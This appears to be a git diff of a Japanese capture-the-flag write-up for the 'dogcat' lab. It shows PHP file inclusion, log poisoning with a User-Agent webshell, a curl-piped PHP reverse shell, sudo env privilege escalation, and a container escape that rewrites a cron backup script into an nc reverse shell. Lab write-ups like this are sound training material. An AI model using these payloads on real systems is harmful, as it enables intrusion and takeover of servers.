@@ -212,6 +212,15 @@ nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 ```
 
+data:スキームは機能しない。  
+http://dogcat.thm/?view=php://filter/convert.base64-decode/resource=data://plain/cat,PD89IGAkX0dFVFswXWA/Pg==&ext=
+
+```
+<b>Warning</b>:  include(php://filter/convert.base64-decode/resource=data://plain/cat,PD89IGAkX0dFVFswXWA/Pg==): failed to open stream: operation failed in <b>/var/www/html/index.php</b> on line <b>24</b><br />
+<br />
+<b>Warning</b>:  include(): Failed opening 'php://filter/convert.base64-decode/resource=data://plain/cat,PD89IGAkX0dFVFswXWA/Pg==' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>24</b><br />
+```
+
 これでログ表示されているので、ログポイズニングを試みる。  
 http://dogcat.thm/?view=cats/../../../../../var/log/apache2/access&ext=.log
 
@@ -220,39 +229,155 @@ $ nc 10.10.75.45 80
 <?=`$_GET[0]`?>
 ```
 
-で送ったが、これはログに出ていなかった。また、URL の一部として送ってみたが、エンコードされたり削除されてから出力されていた。ログポイズニングは断念。
+で送ったが、これはログに出ていなかった。また、URL の一部として送ってみたが、エンコードされたり削除されてから出力されていた。
 
 ```
 "GET /%3C?=`$_GET[0]`?%3E HTTP/1.1"
 ```
 
-続きは後日。
+ログの項目をみると、User-Agentが出力されている。
+
+```
+127.0.0.1 - - [14/Jun/2025:00:41:56 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 
+```
+
+User-Agentをポイズニング。BurpProxyで置き換えた。
+
+```
+GET / HTTP/1.1
+Host: dogcat.thm
+User-Agent: <?=`$_GET[0]`?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+```
+
+phpコマンドのリバースシェル shell.sh をホストする。
+
+```
+php -r '$sock=fsockopen("10.13.85.243",6666);system("sh <&3 >&3 2>&3");'
+```
+
+curlでダウンロードさせ、実行。  
+http://dogcat.thm/?view=cats/../../../../../var/log/apache2/access&ext=.log&0=curl%20http://10.13.85.243:8000/shell.sh%20|%20sh
+
+シェル取得。
+
+```sh
+$ nc -nlvp 6666
+listening on [any] 6666 ...
+connect to [10.13.85.243] from (UNKNOWN) [10.10.230.38] 46878
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
 ## 権限昇格
 
+env を root として実行可能。
+
+```sh
+sudo -l
+Matching Defaults entries for www-data on 9858b2bd3e38:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on 9858b2bd3e38:
+    (root) NOPASSWD: /usr/bin/env
+```
+
+昇格。
+
+```sh
+sudo env /bin/sh
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+```sh
+ls -al /root
+total 20
+drwx------ 1 root root 4096 Mar 10  2020 .
+drwxr-xr-x 1 root root 4096 Jun 14 00:57 ..
+-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+-r-------- 1 root root   35 Mar 10  2020 flag3.txt
+cat /root/flag3.txt
+THM{...........................}
+```
+
+どこかでフラグ２を見逃したらしい。
+
+```sh
+find / -name 'flag*' -type f 2>/dev/null; echo XXXXXX
+/proc/sys/kernel/sched_domain/cpu0/domain0/flags
+/proc/sys/kernel/sched_domain/cpu1/domain0/flags
+/var/www/html/flag.php
+/var/www/flag2_QMW7JvaY2LvK.txt
+/root/flag3.txt
+```
+
+フラグ２回収。
+
+```sh
+cat /var/www/flag2_QMW7JvaY2LvK.txt
+THM{..................}
+```
+
+## Dockerエスケープ
+
+ホストOSで実行するシェルのように見える。
+
+```sh
+ls -al /opt/backups
+total 2892
+drwxr-xr-x 2 root root    4096 Apr  8  2020 .
+drwxr-xr-x 1 root root    4096 Jun 14 00:57 ..
+-rwxr--r-- 1 root root      69 Mar 10  2020 backup.sh
+-rw-r--r-- 1 root root 2949120 Jun 14 01:45 backup.tar
+
+cat /opt/backups/backup.sh
+#!/bin/bash
+tar cf /root/container/backup/backup.tar /root/container
+```
+
+backup.sh を変更
+
+```sh
+echo "#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.13.85.243 8888 >/tmp/f" > /opt/backups/backup.sh
+```
+
+rootシェル取得
+
+```sh
+$ nc -nlvp 8888               
+listening on [any] 8888 ...
+connect to [10.13.85.243] from (UNKNOWN) [10.10.230.38] 46284
+sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+```sh
+# ls -al /root
+total 40
+drwx------  6 root root 4096 Apr  8  2020 .
+drwxr-xr-x 24 root root 4096 Apr  8  2020 ..
+lrwxrwxrwx  1 root root    9 Mar 10  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Apr  8  2020 .cache
+drwxr-xr-x  5 root root 4096 Mar 10  2020 container
+-rw-r--r--  1 root root   80 Mar 10  2020 flag4.txt
+drwx------  3 root root 4096 Apr  8  2020 .gnupg
+drwxr-xr-x  3 root root 4096 Apr  8  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   66 Mar 10  2020 .selected_editor
+# cat /root/flag4.txt
+THM{...........................................................}
+```
+
 ## 振り返り
 
--
--
-
-## シェル安定化メモ
-
-```shell
-# python が無くても、python3 でいける場合もある
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
-
-# Ctrl+Z でバックグラウンドにした後に
-stty raw -echo; fg
-
-#（終了後）エコー無効にして入力非表示になっているので
-reset
-
-# まず、他のターミナルを開いて rows, columns の値を調べる
-stty -a
-
-# リバースシェルで rows, cols を設定する
-stty rows 52
-stty cols 236
-
-```
+- User-Agentでログポイズニングするパターンは初見と思われる。curl や nc ではなかなかうまくいかずかなり時間がかかった。結局、BurpProxyでインターセプトするのが楽だった。
